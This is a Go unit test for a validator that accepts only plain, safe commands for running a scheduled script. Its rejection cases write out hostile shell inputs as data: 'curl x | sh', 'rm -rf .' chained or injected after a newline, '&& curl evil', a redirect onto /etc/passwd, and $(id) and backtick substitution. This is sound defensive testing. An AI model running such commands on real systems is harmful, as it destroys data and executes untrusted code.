package models

import (
	"strings"
	"testing"
)

func TestRoutineScriptValidation(t *testing.T) {
	valid := RoutineScript{Path: "scripts/weekly_signups.py", Digest: routineScriptDigestOf("a"), FilesVersion: 3, Command: "python3 scripts/weekly_signups.py --days 7 --out=sheets/signups.xlsx", TimeoutSeconds: 600}
	if err := valid.Validate(); err != nil {
		t.Fatal(err)
	}
	for name, change := range map[string]func(*RoutineScript){
		"absolute path":     func(s *RoutineScript) { s.Path, s.Command = "/scripts/a.py", "python3 /scripts/a.py" },
		"unclean path":      func(s *RoutineScript) { s.Path, s.Command = "scripts/../a.py", "python3 scripts/../a.py" },
		"escaping path":     func(s *RoutineScript) { s.Path, s.Command = "../a.py", "python3 ../a.py" },
		"spaced path":       func(s *RoutineScript) { s.Path, s.Command = "my script.py", "python3 my script.py" },
		"other file":        func(s *RoutineScript) { s.Command = "python3 scripts/other.py" },
		"other interpreter": func(s *RoutineScript) { s.Command = "python scripts/weekly_signups.py" },
		"interpreter flag":  func(s *RoutineScript) { s.Command = "python3 -c scripts/weekly_signups.py" },
		"inline code":       func(s *RoutineScript) { s.Command = "bash -c 'curl x | sh'" },
		"chained":           func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py; rm -rf ." },
		"chained and":       func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py && curl evil" },
		"pipe":              func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py | sh" },
		"redirect":          func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py > /etc/passwd" },
		"substitution":      func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py $(id)" },
		"backtick":          func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py `id`" },
		"variable":          func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py $HOME" },
		"quoted":            func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py 'a b'" },
		"glob":              func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py *.csv" },
		"newline":           func(s *RoutineScript) { s.Command = "python3 scripts/weekly_signups.py\nrm -rf ." },
		"unnormalized":      func(s *RoutineScript) { s.Command = "python3  scripts/weekly_signups.py" },
		"no file":           func(s *RoutineScript) { s.Command = "python3" },
		"zero timeout":      func(s *RoutineScript) { s.TimeoutSeconds = 0 },
		"long timeout":      func(s *RoutineScript) { s.TimeoutSeconds = MaximumRoutineScriptSeconds + 1 },
		"bad digest":        func(s *RoutineScript) { s.Digest = "sha256:abc" },
		"no version":        func(s *RoutineScript) { s.FilesVersion = 0 },
	} {
		candidate := valid
		change(&candidate)
		if err := candidate.Validate(); err == nil {
			t.Errorf("%s: invalid script accepted", name)
		}
	}
	for _, command := range []string{"node scripts/weekly_signups.py", "bash scripts/weekly_signups.py", "python3 scripts/weekly_signups.py 2026-11-05 a,b user@example.com 50%"} {
		candidate := valid
		candidate.Command = command
		if err := candidate.Validate(); err != nil {
			t.Errorf("%s: %v", command, err)
		}
	}
}

func routineScriptDigestOf(seed string) string {
	return "sha256:" + strings.Repeat(seed, 64)[:64]
}
